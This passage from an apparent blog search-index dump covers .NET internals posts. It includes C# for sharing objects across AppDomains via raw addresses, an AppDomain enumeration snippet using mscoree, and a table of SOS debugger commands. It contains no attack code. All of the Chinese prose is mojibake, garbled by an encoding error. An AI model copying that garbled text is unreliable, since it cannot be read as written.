0; i &lt; 10000; i++) // try it often to see how the AppDomains do behave &#123; // To load our assembly appdomain neutral we need to use MultiDomainHost // on our hosting and child domain If not we would get different Method // tables for the same types which would result in InvalidCastExceptions // for the same type. // Prerequisite for MultiDomainHost is that the assembly we share the data // is a) Installed into the GAC (which requires as strong name as well) If // you would use MultiDomain then it would work but all AppDomain neutral // assemblies will never be unloaded. var other = AppDomain.CreateDomain( &quot;Test&quot; + i.ToString(), AppDomain.CurrentDomain.Evidence, new AppDomainSetup &#123; LoaderOptimization = LoaderOptimization.MultiDomainHost, &#125;); // Create gate object in other appdomain DomainGate gate = (DomainGate)other.CreateInstanceAndUnwrap( Assembly.GetExecutingAssembly().FullName, typeof(DomainGate).FullName); // now lets create some data CrossDomainData data = new CrossDomainData(); data.Input = Enumerable.Range(0, 10).ToList(); // process it in other AppDomain DomainGate.Send(gate, data); // Display result calculated in other AppDomain Console.WriteLine(&quot;Calculation in other AppDomain got: &#123;0&#125;&quot;, data.Aggregate); AppDomain.Unload(other); // check in debugger now if UnitTests.dll has been unloaded. Console.WriteLine(&quot;AppDomain unloaded&quot;); &#125; &#125; ä½¿ç”¨ LoaderOptimzation.MultiDomainHost å¸è½½åœ¨å¦ä¸€ä¸ª AppDomain æ²¡æœ‰ GC çš„ç¨‹åºé›†ã€‚åŒæ—¶å¿…é¡»ä» GAC åŠ è½½è‡ªå®šä¹‰çš„ CrossDomainData çš„ç¨‹åºé›†ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647/// &lt;summary&gt;/// Enables sharing of data between appdomains as plain objects without any/// marsalling overhead./// &lt;/summary&gt;class DomainGate : MarshalByRefObject &#123; /// &lt;summary&gt; /// Operate on a plain object which is shared from another AppDomain. /// &lt;/summary&gt; /// &lt;param name=&quot;gcCount&quot;&gt;Total number of GCs&lt;/param&gt; /// &lt;param name=&quot;objAddress&quot;&gt;Address to managed object.&lt;/param&gt; public void DoSomething(int gcCount, IntPtr objAddress) &#123; if (gcCount != ObjectAddress.GCCount) &#123; throw new NotSupportedException( &quot;During the call a GC did happen. Please try again.&quot;); &#125; // If you get an exception here disable under Projces/Debugging/Enable // Visual Studio Hosting Process The appdomain which is used there seems to // use LoaderOptimization.SingleDomain CrossDomainData data = (CrossDomainData)PtrConverter&lt;Object&gt;.Default.ConvertFromIntPtr( objAddress); ; // process input data from other domain foreach (var x in data.Input) &#123; Console.WriteLine(x); &#125; OtherAssembliesUsage user = new OtherAssembliesUsage(); // generate output data data.Aggregate = data.Input.Aggregate((x, y) =&gt; x + y); &#125; public static void Send(DomainGate gate, object o) &#123; var old = GCSettings.LatencyMode; try &#123; GCSettings.LatencyMode = GCLatencyMode.Batch; // try to keep the GC out of our stuff var addandGCCount = ObjectAddress.GetAddress(o); gate.DoSomething(addandGCCount.Value, addandGCCount.Key); &#125; finally &#123; GCSettings.LatencyMode = old; &#125; &#125;&#125;","tags":[{"name":"DotNet","slug":"DotNet","permalink":"https://hodlyounger.github.io/tags/DotNet/"},{"name":"AppDomain","slug":"AppDomain","permalink":"https://hodlyounger.github.io/tags/AppDomain/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"CSharp","slug":"B-Code/CSharp","permalink":"https://hodlyounger.github.io/categories/B-Code/CSharp/"}]},{"title":"ã€.Netã€‘index","date":"2024-07-03T16:00:00.000Z","path":"B_Code/CSharp/ã€.Netã€‘index/","text":"é˜…è¯»è¿™ç¯‡æ–‡æ¡£ä½ ä¼šäº†è§£åˆ°ï¼š .Net çš„ç›¸å…³æŠ€æœ¯æ–‡ç« å’Œè§£å†³æ–¹æ¡ˆ .Net å®ç°ç»†èŠ‚ .Net å¼€æºé¡¹ç›® Stack Overflow ä¸Šå…³äº .Net çš„ç›¸å…³è¯é¢˜ 0x01 æ–‡ç« æ¨è Why is AppDomain.AppendPrivatePath Obsolete? - .NET Blog .NET Framework Internals: How the CLR Creates Runtime Objects | Microsoft Learn (è½¬)TransparentProxy/RealProxy å­ªç”Ÿå…„å¼Ÿ - æŸ èŒ¶ - åšå®¢å›­ å¦‚ä½•ä½¿ç”¨ RealProxy .net - List AppDomains in Process - Stack Overflow è·å–æ‰€æœ‰çš„ AppDomain The Truth About .NET Objects And Sharing Them Between AppDomains - Geeks with Blogs .Net æ˜¯å¦‚ä½•åœ¨ AppDomain ä¹‹é—´å…±äº«çš„ Assemblyã€‚ä»¥åŠå¦‚ä½•åœ¨ AppDomain ä¹‹é—´å…±äº«æ•°æ® .NET Internals Cookbook Part 0 â€” Table of contents â€“ Random IT Utensils .Net ç³»åˆ—æ–‡ç« ï¼Œä»‹ç»äº† .Net ä¸­çš„å¾ˆå¤šç‰¹æ€§ã€‚ Concept of Shared Assembly in .NET å¦‚ä½•åˆ›å»ºä¸€ä¸ª shared dll å¹¶åŠ è½½åˆ°ç¨‹åºé›†ä¸­ runtime/docs/design/coreclr/botr/method-descriptor.md at main Â· dotnet/runtime MethodDesc çš„è¯´æ˜ How does .NET JIT a method? (also featuring â€˜Tiered Compilationâ€™) - DEV Community .Net JIT çš„å·¥ä½œåŸç† å¼€æºé¡¹ç›®æ¨è How to Make an ISAPI Redirection Filter - CodeProject å¦‚ä½•åˆ›å»ºä¸€ä¸ª ISAPI çš„é‡å®šå‘è¿‡æ»¤ secana/PeNet: Portable Executable (PE) library written in .Net ä½¿ç”¨ .Net è§£æ PE æ–‡ä»¶ Stack Overflow c# - Shared domain for app domain while trying to run microsoft reportviwer in legacy mode - Stack Overflow äº†è§£åˆ° AppDomain æ˜¯å¦‚ä½•è¢«åŠ è½½çš„ã€‚Shared Domain çš„ç›¸å…³å†…å®¹ã€‚ LoaderOptimization Enum (System) | Microsoft Learn c# - Get Memory Address of Loaded Assemblies - Stack Overflow è·å–ç¨‹åºé›†çš„åŠ è½½åœ°å€ è§†é¢‘æ•™ç¨‹ Net CLR æºç çº§çš„æ•™ç¨‹ï¼Œå¸¦ä½ è¿›å…¥.Neté¡¶çº§é«˜æ‰‹è¡Œåˆ—_å“”å“©å“”å“©_bilibili","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"CSharp","slug":"B-Code/CSharp","permalink":"https://hodlyounger.github.io/categories/B-Code/CSharp/"}]},{"title":"ã€.Netã€‘ä½¿ç”¨ mscoree","date":"2024-07-01T16:00:00.000Z","path":"B_Code/CSharp/ã€.Netã€‘ä½¿ç”¨ mscoree/","text":"æ¦‚è¿°ï¼šå¦‚ä½•åœ¨ä»£ç ä¸­ä½¿ç”¨ mscoree 0x01 æ·»åŠ  mcsoree.cs 1234567891011121314151617181920212223242526272829// MSCOREE.CSusing System;using System.Collections.Generic;using System.Linq;using System.Runtime.CompilerServices;using System.Runtime.InteropServices;using System.Text;using System.Threading.Tasks;namespace mscoree&#123; [CompilerGenerated] [Guid(&quot;CB2F6722-AB3A-11D2-9C40-00C04FA30A3E&quot;)] [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)] [TypeIdentifier] [ComImport] [CLSCompliant(false)] public interface ICorRuntimeHost &#123; void _VtblGap1_11(); void EnumDomains(out IntPtr enumHandle); void NextDomain([In] IntPtr enumHandle, [MarshalAs(UnmanagedType.IUnknown)] out object appDomain); void CloseEnum([In] IntPtr enumHandle); &#125;&#125; 0x02 æ·»åŠ å¯¼å‡ºå‡½æ•° 1234private static ICorRuntimeHost GetCorRuntimeHost()&#123; return (ICorRuntimeHost)Activator.CreateInstance(Marshal.GetTypeFromCLSID(new Guid(&quot;CB2F6723-AB3A-11D2-9C40-00C04FA30A3E&quot;)));&#125; 0x03 ä½¿ç”¨ 12ICorRuntimeHost host = null;host = GetCorRuntimeHost(); 0x04 è·å–æ‰€æœ‰ AppDomains 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768static void GetAllAppDomains()&#123; AppDomain one = AppDomain.CreateDomain(&quot;One&quot;); AppDomain two = AppDomain.CreateDomain(&quot;Two&quot;); // Creates 2 app domains List&lt;AppDomain&gt; appDomains = new List&lt;AppDomain&gt;(); IntPtr enumHandle = IntPtr.Zero; ICorRuntimeHost host = null; host = GetCorRuntimeHost(); try &#123; host.EnumDomains(out enumHandle); object domain = null; AppDomain tempDomain; while (true) &#123; host.NextDomain(enumHandle, out domain); if (domain == null) &#123; break; &#125; tempDomain = domain as AppDomain; appDomains.Add(tempDomain); &#125; &#125; catch (Exception ex) &#123; Console.WriteLine(ex.ToString()); &#125; finally &#123; host.CloseEnum(enumHandle); int rel = Marshal.ReleaseComObject(host); &#125; Assembly[] assemblies; foreach (AppDomain app in appDomains) &#123; Console.WriteLine(app.FriendlyName); assemblies = app.GetAssemblies(); Console.WriteLine(&quot;-----------------------Assemblies------------------&quot;); foreach (Assembly assem in assemblies) &#123; Console.WriteLine(assem.FullName); &#125; Console.WriteLine(&quot;---------------------------------------------------&quot;); &#125;&#125;","tags":[{"name":"DotNet","slug":"DotNet","permalink":"https://hodlyounger.github.io/tags/DotNet/"},{"name":"Code/Dotnet","slug":"Code-Dotnet","permalink":"https://hodlyounger.github.io/tags/Code-Dotnet/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"CSharp","slug":"B-Code/CSharp","permalink":"https://hodlyounger.github.io/categories/B-Code/CSharp/"}]},{"title":"ã€è°ƒè¯•æŠ€æœ¯ã€‘.Net è°ƒè¯•åŸºç¡€å‘½ä»¤","date":"2024-06-30T16:00:00.000Z","path":"wiki/è°ƒè¯•æŠ€æœ¯/ã€è°ƒè¯•æŠ€æœ¯ã€‘.Net è°ƒè¯•åŸºç¡€å‘½ä»¤/","text":"æ¦‚è¿°ï¼š.Net è°ƒè¯•å‘½ä»¤ã€‚ä¸»è¦æ˜¯ SOS (Son of Strike) æä¾›çš„èƒ½åŠ› å‚è€ƒæ–‡ç« ï¼š.NET çš„ SOS è°ƒè¯•æ‰©å±• - .NET | Microsoft Learn [toc] LLDB è°ƒè¯•ç¨‹åº æœ‰å…³é’ˆå¯¹ LLDB é…ç½® SOS çš„è¯´æ˜ï¼Œè¯·å‚é˜… dotnet-sosã€‚ å¯å¯¹å®æ—¶è¿›ç¨‹æˆ–è½¬å‚¨ä½¿ç”¨ SOS å‘½ä»¤ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œå¯ä»¥é€šè¿‡è¾“å…¥ä»¥ä¸‹å†…å®¹æ¥ä½¿ç”¨æ‰€æœ‰ SOS å‘½ä»¤ï¼šsos [command_name]ã€‚ ä½†æ˜¯ï¼Œå¸¸è§å‘½ä»¤å·²æœ‰åˆ«åï¼Œå› æ­¤ä½ ä¸éœ€è¦ sos å‰ç¼€ï¼š å±•å¼€è¡¨ å‘½ä»¤ å‡½æ•° analyzeoom æ˜¾ç¤ºå¯¹ GC å †è¿›è¡Œåˆ†é…è¯·æ±‚æ—¶å‘ç”Ÿçš„æœ€å OOM çš„ä¿¡æ¯ã€‚ bpmd åœ¨æŒ‡å®šæ¨¡å—ä¸­çš„æŒ‡å®šæ‰˜ç®¡æ–¹æ³•å¤„åˆ›å»ºæ–­ç‚¹ã€‚ clrmodules åˆ—å‡ºè¿›ç¨‹ä¸­çš„æ‰˜ç®¡æ¨¡å—ã€‚ clrstack ä»…æä¾›æ‰˜ç®¡ä»£ç çš„å †æ ˆè·Ÿè¸ªã€‚ clrthreads åˆ—å‡ºæ­£åœ¨è¿è¡Œçš„æ‰˜ç®¡çº¿ç¨‹ã€‚ clru æ˜¾ç¤ºæ‰˜ç®¡æ–¹æ³•çš„æ‰¹æ³¨åæ±‡ç¼–ã€‚ dbgout å¯ç”¨/ç¦ç”¨ (-off) å†…éƒ¨ SOS æ—¥å¿—è®°å½•ã€‚ dso æ˜¾ç¤ºåœ¨å½“å‰å †æ ˆçš„è¾¹ç•Œå†…æ‰¾åˆ°çš„æ‰€æœ‰æ‰˜ç®¡å¯¹è±¡ã€‚ dumpalc æ˜¾ç¤ºæœ‰å…³æŒ‡å®šå¯¹è±¡åŠ è½½åˆ°çš„å¯å›æ”¶ AssemblyLoadContext çš„è¯¦ç»†ä¿¡æ¯ã€‚ dumparray æ˜¾ç¤ºæœ‰å…³æ‰˜ç®¡æ•°ç»„çš„è¯¦ç»†ä¿¡æ¯ã€‚ dumpasync æ˜¾ç¤ºæœ‰å…³åƒåœ¾å›æ”¶å †ä¸Šå¼‚æ­¥çŠ¶æ€æœºçš„ä¿¡æ¯ã€‚ dumpassembly æ˜¾ç¤ºæœ‰å…³ç¨‹åºé›†çš„è¯¦ç»†ä¿¡æ¯ã€‚ dumpclass æ˜¾ç¤ºæœ‰å…³æŒ‡å®šåœ°å€å¤„çš„ EEClass ç»“æ„çš„ä¿¡æ¯ã€‚ dumpconcurrentdictionary æ˜¾ç¤ºå¹¶å‘å­—å…¸å†…å®¹ã€‚ dumpconcurrentqueue æ˜¾ç¤ºå¹¶å‘é˜Ÿåˆ—å†…å®¹ã€‚ dumpdelegate æ˜¾ç¤ºæœ‰å…³å§”æ‰˜çš„ä¿¡æ¯ã€‚ dumpdomain æ˜¾ç¤ºæœ‰å…³æ‰€æœ‰ AppDomain æˆ–æŒ‡å®š AppDomain ä¸­çš„æ‰€æœ‰ç¨‹åºé›†çš„ä¿¡æ¯ã€‚ dumpgcdata æ˜¾ç¤ºæœ‰å…³ GC æ•°æ®çš„ä¿¡æ¯ã€‚ dumpgen æ˜¾ç¤ºæŒ‡å®šä»£ç³»çš„å †å†…å®¹ã€‚ dumpheap æ˜¾ç¤ºæœ‰å…³åƒåœ¾å›æ”¶å †çš„ä¿¡æ¯å’Œæœ‰å…³å¯¹è±¡çš„æ”¶é›†ç»Ÿè®¡ä¿¡æ¯ã€‚ dumpil æ˜¾ç¤ºä¸æ‰˜ç®¡æ–¹æ³•å…³è”çš„å…¬å…±ä¸­é—´è¯­è¨€ï¼ˆCILï¼‰ã€‚ dumplog å°†å†…å­˜ä¸­å‹åŠ›æ—¥å¿—çš„å†…å®¹å†™å…¥åˆ°æŒ‡å®šæ–‡ä»¶ã€‚ dumpmd æ˜¾ç¤ºæœ‰å…³æŒ‡å®šåœ°å€å¤„çš„ MethodDesc ç»“æ„çš„ä¿¡æ¯ã€‚ dumpmodule æ˜¾ç¤ºæœ‰å…³æŒ‡å®šåœ°å€å¤„çš„æ¨¡å—çš„ä¿¡æ¯ã€‚ dumpmt æ˜¾ç¤ºæœ‰å…³æŒ‡å®šåœ°å€å¤„çš„æ–¹æ³•è¡¨çš„ä¿¡æ¯ã€‚ dumpobj æ˜¾ç¤ºæœ‰å…³æŒ‡å®šåœ°å€å¤„çš„å¯¹è±¡çš„ä¿¡æ¯ã€‚ dumpruntimetypes æŸ¥æ‰¾ GC å †ä¸­çš„æ‰€æœ‰ System.RuntimeType å¯¹è±¡ï¼Œå¹¶è¾“å‡ºå®ƒä»¬å¼•ç”¨çš„ç±»å‹åç§°å’Œ MethodTableã€‚ dumpsig è½¬å‚¨ç”± &lt;sigaddr&gt; &lt;moduleaddr&gt; æŒ‡å®šçš„æ–¹æ³•æˆ–å­—æ®µçš„ç­¾åã€‚ dumpsigelem è½¬å‚¨ç­¾åå¯¹è±¡çš„å•ä¸ªå…ƒç´ ã€‚ dumpstack æ˜¾ç¤ºåŸç”Ÿå’Œæ‰˜ç®¡å †æ ˆè·Ÿè¸ªã€‚ dumpstackobjects æ˜¾ç¤ºåœ¨å½“å‰å †æ ˆçš„è¾¹ç•Œå†…æ‰¾åˆ°çš„æ‰€æœ‰æ‰˜ç®¡å¯¹è±¡ã€‚ dumpvc æ˜¾ç¤ºæœ‰å…³å€¼ç±»çš„å­—æ®µçš„ä¿¡æ¯ã€‚ eeheap æ˜¾ç¤ºæœ‰å…³å†…éƒ¨è¿è¡Œæ—¶æ•°æ®ç»“æ„æ‰€ä½¿ç”¨çš„è¿›ç¨‹å†…å­˜çš„ä¿¡æ¯ã€‚ eestack å¯¹è¿›ç¨‹ä¸­çš„æ‰€æœ‰çº¿ç¨‹è¿è¡Œ dumpstack å‘½ä»¤ã€‚ eeversion æ˜¾ç¤ºæœ‰å…³è¿è¡Œæ—¶å’Œ SOS ç‰ˆæœ¬çš„ä¿¡æ¯ã€‚ ehinfo æ˜¾ç¤º JIT æ–¹æ³•ä¸­çš„å¼‚å¸¸å¤„ç†å—ã€‚ finalizequeue æ˜¾ç¤ºæ‰€æœ‰å·²è¿›è¡Œç»ˆç»“æ³¨å†Œçš„å¯¹è±¡ã€‚ findappdomain å°è¯•è§£æ GC å¯¹è±¡çš„ AppDomainã€‚ findroots è·¨ GC é›†åˆæŸ¥æ‰¾å¹¶æ˜¾ç¤ºå¯¹è±¡æ ¹ã€‚ gchandles æ˜¾ç¤ºæœ‰å…³è¿›ç¨‹ä¸­çš„åƒåœ¾å›æ”¶å™¨å¥æŸ„çš„ç»Ÿè®¡ä¿¡æ¯ã€‚ gcheapstat æ˜¾ç¤ºæœ‰å…³åƒåœ¾å›æ”¶å™¨çš„ç»Ÿè®¡ä¿¡æ¯ã€‚ gcinfo æ˜¾ç¤ºæ–¹æ³•çš„ JIT GC ç¼–ç ã€‚ gcroot æ˜¾ç¤ºæœ‰å…³å¯¹æŒ‡å®šåœ°å€å¤„çš„å¯¹è±¡çš„å¼•ç”¨ï¼ˆæˆ–æ ¹ï¼‰çš„ä¿¡æ¯ã€‚ gcwhere æ˜¾ç¤ºæŒ‡å®šåœ°å€åœ¨ GC å †ä¸­çš„ä½ç½®ã€‚ histclear é‡Šæ”¾ç”± Hist å‘½ä»¤ç³»åˆ—ä½¿ç”¨çš„ä»»ä½•èµ„æºã€‚ histinit ä»ä¿å­˜åœ¨è°ƒè¯•å¯¹è±¡ä¸­çš„å‹åŠ›æ—¥å¿—åˆå§‹åŒ– SOS ç»“æ„ã€‚ histobj æ£€æŸ¥æ‰€æœ‰å‹åŠ›æ—¥å¿—çš„é‡å®šä½è®°å½•ï¼Œå¹¶æ˜¾ç¤ºå¯èƒ½å·²å°†åœ°å€ä½œä¸ºè‡ªå˜é‡ä¼ å…¥çš„åƒåœ¾å›æ”¶é‡å®šä½é“¾ã€‚ histobjfind æ˜¾ç¤ºåœ¨æŒ‡å®šåœ°å€å¤„å¼•ç”¨å¯¹è±¡çš„æ‰€æœ‰æ—¥å¿—é¡¹ã€‚ histroot æ˜¾ç¤ºä¸æŒ‡å®šæ ¹çš„æå‡å’Œé‡å®šä½ç›¸å…³çš„ä¿¡æ¯ã€‚ histstats æ˜¾ç¤ºå‹åŠ›æ—¥å¿—ç»Ÿè®¡ä¿¡æ¯ã€‚ ip2md æ˜¾ç¤ºå·² JIT ç¼–è¯‘çš„ä»£ç ä¸­æŒ‡å®šåœ°å€å¤„çš„ MethodDesc ç»“æ„ã€‚ listnearobj æ˜¾ç¤ºæŒ‡å®šåœ°å€å‰åçš„å¯¹è±¡ã€‚ loadsymbols åŠ è½½ .NET æœ¬æœºæ¨¡å—ç¬¦å·ã€‚ logging å¯ç”¨/ç¦ç”¨å†…éƒ¨ SOS æ—¥å¿—è®°å½•ã€‚ name2ee æ˜¾ç¤ºæŒ‡å®šæ¨¡å—ä¸­çš„æŒ‡å®šç±»å‹æˆ–æ–¹æ³•çš„ MethodTable å’Œ EEClass ç»“æ„ã€‚ objsize æ˜¾ç¤ºæŒ‡å®šå¯¹è±¡çš„å¤§å°ã€‚ parallelstacks æ˜¾ç¤ºä¸ Visual Studioâ€œå¹¶è¡Œå †æ ˆâ€é¢æ¿ç±»ä¼¼çš„åˆå¹¶çº¿ç¨‹å †æ ˆã€‚ pathto æ˜¾ç¤ºä» &lt;root&gt; åˆ° &lt;target&gt; çš„ GC è·¯å¾„ã€‚ pe æ˜¾ç¤ºä»æŒ‡å®šåœ°å€å¤„çš„ Exception ç±»æ´¾ç”Ÿçš„ä»»ä½•å¯¹è±¡çš„å­—æ®µå¹¶è®¾ç½®è¿™äº›å­—æ®µçš„æ ¼å¼ã€‚ printexception æ˜¾ç¤ºä»æŒ‡å®šåœ°å€å¤„çš„ Exception ç±»æ´¾ç”Ÿçš„ä»»ä½•å¯¹è±¡çš„å­—æ®µå¹¶è®¾ç½®è¿™äº›å­—æ®µçš„æ ¼å¼ã€‚ runtimes åˆ—å‡ºç›®æ ‡ä¸­çš„è¿è¡Œæ—¶æˆ–æ›´æ”¹é»˜è®¤è¿è¡Œæ—¶ã€‚ stoponcatch ç›®æ ‡è¿›ç¨‹å°†åœ¨ä¸‹æ¬¡æ‰§è¡ŒæœŸé—´æ•è·æ‰˜ç®¡å¼‚å¸¸æ—¶ä¸­æ–­ã€‚ setclrpath è®¾ç½®ç”¨äºåŠ è½½ coreclr dac/dbi æ–‡ä»¶çš„è·¯å¾„ã€‚ setclrpath &lt;path&gt;ã€‚ sethostruntime è®¾ç½®æˆ–æ˜¾ç¤ºç”¨äºåœ¨ SOS ä¸­è¿è¡Œæ‰˜ç®¡ä»£ç çš„ .NET è¿è¡Œæ—¶ç›®å½•ã€‚ setsymbolserver å¯ç”¨ç¬¦å·æœåŠ¡å™¨æ”¯æŒã€‚ setsostid è®¾ç½®å½“å‰ OS tid/thread ç´¢å¼•ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ lldb æä¾›çš„ç´¢å¼•ã€‚ setsostid &lt;tid&gt; &lt;index&gt;ã€‚ sos æ‰§è¡Œå„ç§ coreclr è°ƒè¯•å‘½ä»¤ã€‚ ä½¿ç”¨è¯­æ³• sos &lt;command-name&gt; &lt;args&gt;ã€‚ æœ‰å…³è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…â€œsoshelpâ€ã€‚ soshelp åœ¨æœªæŒ‡å®šå‚æ•°æ—¶æ˜¾ç¤ºæ‰€æœ‰å¯ç”¨å‘½ä»¤ï¼Œæˆ–è€…æ˜¾ç¤ºæœ‰å…³æŒ‡å®šå‘½ä»¤çš„è¯¦ç»†å¸®åŠ©ä¿¡æ¯ï¼šsoshelp &lt;command&gt;ã€‚ syncblk æ˜¾ç¤º SyncBlock æŒæœ‰è€…ä¿¡æ¯ã€‚ taskstate ä»¥äººç±»å¯è¯»æ ¼å¼æ˜¾ç¤ºä»»åŠ¡çŠ¶æ€ã€‚ threadpool æ˜¾ç¤ºæœ‰å…³è¿è¡Œæ—¶çº¿ç¨‹æ± çš„ä¿¡æ¯ã€‚ threadpoolqueue æ˜¾ç¤ºæ’é˜Ÿçš„çº¿ç¨‹æ± å·¥ä½œé¡¹ã€‚ threadstate æ•´é½è¾“å‡ºçº¿ç¨‹çŠ¶æ€çš„å«ä¹‰ã€‚ timerinfo æ˜¾ç¤ºæœ‰å…³æ­£åœ¨è¿è¡Œçš„è®¡æ—¶å™¨çš„ä¿¡æ¯ã€‚ token2ee æ˜¾ç¤ºæŒ‡å®šä»¤ç‰Œå’Œæ¨¡å—çš„ MethodTable ç»“æ„å’Œ MethodDesc ç»“æ„ã€‚ traverseheap ä»¥ CLR æ¢æŸ¥å™¨èƒ½å¤Ÿç†è§£çš„æ ¼å¼å°†å †ä¿¡æ¯å†™å…¥æ–‡ä»¶ã€‚ verifyheap æ£€æŸ¥ GC å †æ˜¯å¦æœ‰æŸåçš„è¿¹è±¡ã€‚ verifyobj æ£€æŸ¥ä½œä¸ºè‡ªå˜é‡ä¼ é€’çš„å¯¹è±¡æ˜¯å¦æœ‰æŸåè¿¹è±¡ã€‚ Windbg/cdb ç¤ºä¾‹ç”¨æ³• å±•å¼€è¡¨ Command è¯´æ˜ !dumparray -start 2 -length 5 -details 00ad28d0 æ˜¾ç¤ºåœ°å€ 00ad28d0 å¤„çš„æ•°ç»„å†…å®¹ã€‚ æ˜¾ç¤ºä»ç¬¬äºŒä¸ªå…ƒç´ å¼€å§‹ï¼Œè¿ç»­æ˜¾ç¤ºäº”ä¸ªå…ƒç´ ã€‚ !dumpassembly 1ca248 æ˜¾ç¤ºåœ°å€ 1ca248 å¤„çš„ç¨‹åºé›†å†…å®¹ã€‚ !dumpheap æ˜¾ç¤ºæœ‰å…³åƒåœ¾å›æ”¶å™¨å †çš„ä¿¡æ¯ã€‚ !DumpLog å°†å†…å­˜ä¸­å‹åŠ›æ—¥å¿—çš„å†…å®¹å†™å…¥åˆ°å½“å‰ç›®å½•ä¸­åä¸º StressLog.txt çš„ï¼ˆé»˜è®¤ï¼‰æ–‡ä»¶ä¸­ã€‚ !dumpmd 902f40 æ˜¾ç¤ºåœ¨åœ°å€ MethodDesc å¤„çš„ 902f40 ç»“æ„ã€‚ !dumpmodule 1caa50 æ˜¾ç¤ºæœ‰å…³åœ°å€ 1caa50 å¤„çš„æ¨¡å—çš„ä¿¡æ¯ã€‚ !DumpObj a79d40 æ˜¾ç¤ºæœ‰å…³åœ°å€ a79d40 å¤„çš„å¯¹è±¡çš„ä¿¡æ¯ã€‚ !DumpVC 0090320c 00a79d9c ä½¿ç”¨åœ°å€ 00a79d9c å¤„çš„æ–¹æ³•è¡¨æ˜¾ç¤ºåœ°å€ 0090320c å¤„çš„å€¼ç±»çš„å­—æ®µã€‚ !eeheap -gc æ˜¾ç¤ºåƒåœ¾å›æ”¶å™¨æ‰€ä½¿ç”¨çš„è¿›ç¨‹å†…å­˜ã€‚ !finalizequeue æ˜¾ç¤ºæ‰€æœ‰å·²åšå¥½ç»ˆç»“è®¡åˆ’çš„å¯¹è±¡ã€‚ !findappdomain 00a79d98 ç¡®å®šåœ°å€ 00a79d98 å¤„çš„å¯¹è±¡çš„åº”ç”¨ç¨‹åºåŸŸã€‚ !gcinfo 5b68dbb8 æ˜¾ç¤ºå½“å‰è¿›ç¨‹ä¸­çš„æ‰€æœ‰åƒåœ¾å›æ”¶å™¨å¥æŸ„ã€‚ !name2ee unittest.exe MainClass.Main æ˜¾ç¤ºæ¨¡å— unittest.exe çš„ç±» MainClass ä¸­çš„ Main æ–¹æ³•çš„ MethodTable å’Œ EEClass ç»“æ„ã€‚ !token2ee unittest.exe 02000003 æ˜¾ç¤ºæœ‰å…³æ¨¡å— unittest.exe ä¸­çš„åœ°å€ 02000003 å¤„çš„å…ƒæ•°æ®æ ‡è®°çš„ä¿¡æ¯ã€‚ LLDB ç¤ºä¾‹ç”¨æ³• å±•å¼€è¡¨ Command è¯´æ˜ dumparray -start 2 -length 5 -details 00ad28d0 æ˜¾ç¤ºåœ°å€ 00ad28d0 å¤„çš„æ•°ç»„å†…å®¹ã€‚ æ˜¾ç¤ºä»ç¬¬äºŒä¸ªå…ƒç´ å¼€å§‹ï¼Œè¿ç»­æ˜¾ç¤ºäº”ä¸ªå…ƒç´ ã€‚ dumpassembly 1ca248 æ˜¾ç¤ºåœ°å€ 1ca248 å¤„çš„ç¨‹åºé›†å†…å®¹ã€‚ dumpheap æ˜¾ç¤ºæœ‰å…³åƒåœ¾å›æ”¶å™¨å †çš„ä¿¡æ¯ã€‚ dumplog å°†å†…å­˜ä¸­å‹åŠ›æ—¥å¿—çš„å†…å®¹å†™å…¥åˆ°å½“å‰ç›®å½•ä¸­åä¸º StressLog.txt çš„ï¼ˆé»˜è®¤ï¼‰æ–‡ä»¶ä¸­ã€‚ dumpmd 902f40 æ˜¾ç¤ºåœ¨åœ°å€ MethodDesc å¤„çš„ 902f40 ç»“æ„ã€‚ dumpmodule 1caa50 æ˜¾ç¤ºæœ‰å…³åœ°å€ 1caa50 å¤„çš„æ¨¡å—çš„ä¿¡æ¯ã€‚ dumpobj a79d40 æ˜¾ç¤ºæœ‰å…³åœ°å€ a79d40 å¤„çš„å¯¹è±¡çš„ä¿¡æ¯ã€‚ dumpvc 0090320c 00a79d9c ä½¿ç”¨åœ°å€ 00a79d9c å¤„çš„æ–¹æ³•è¡¨æ˜¾ç¤ºåœ°å€ 0090320c å¤„çš„å€¼ç±»çš„å­—æ®µã€‚ eeheap -gc æ˜¾ç¤ºåƒåœ¾å›æ”¶å™¨æ‰€ä½¿ç”¨çš„è¿›ç¨‹å†…å­˜ã€‚ findappdomain 00a79d98 ç¡®å®šåœ°å€ 00a79d98 å¤„çš„å¯¹è±¡çš„åº”ç”¨ç¨‹åºåŸŸã€‚ gcinfo 5b68dbb8 æ˜¾ç¤ºå½“å‰è¿›ç¨‹ä¸­çš„æ‰€æœ‰åƒåœ¾å›æ”¶å™¨å¥æŸ„ã€‚ name2ee unittest.exe MainClass.Main æ˜¾ç¤ºæ¨¡å— unittest.exe çš„ç±» MainClass ä¸­çš„ Main æ–¹æ³•çš„ MethodTable å’Œ EEClass ç»“æ„ã€‚ token2ee unittest.exe 02000003 æ˜¾ç¤ºæœ‰å…³æ¨¡å— unittest.exe ä¸­çš„åœ°å€ 02000003 å¤„çš„å…ƒæ•°æ®æ ‡è®°çš„ä¿¡æ¯ã€‚ clrthreads æ˜¾ç¤ºæ‰˜ç®¡çº¿ç¨‹ã€‚","tags":[{"name":"DotNet","slug":"DotNet","permalink":"https://hodlyounger.github.io/tags/DotNet/"},{"name":"Code/DotNet","slug":"Code-DotNet","permalink":"https://hodlyounger.github.io/tags/Code-DotNet/"},{"name":"Debug","slug":"Debug","permalink":"https://hodlyounger.github.io/tags/Debug/"}],"categories":[{"name":"wiki","slug":"wiki","permalink":"https://hodlyounger.github.io/categories/wiki/"},{"name":"è°ƒè¯•æŠ€æœ¯","slug":"wiki/è°ƒè¯•æŠ€æœ¯","permalink":"https://hodlyounger.github.io/categories/wiki/%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/"}]},{"title":"ã€.Netã€‘JIT And Run[ç¿»è¯‘]","date":"2024-06-30T13:25:50.344Z","path":"B_Code/CSharp/ã€.Netã€‘JIT And Run/","text":"æ¦‚è¿°ï¼šå¾®è½¯æ–‡æ¡£ JIT And Run 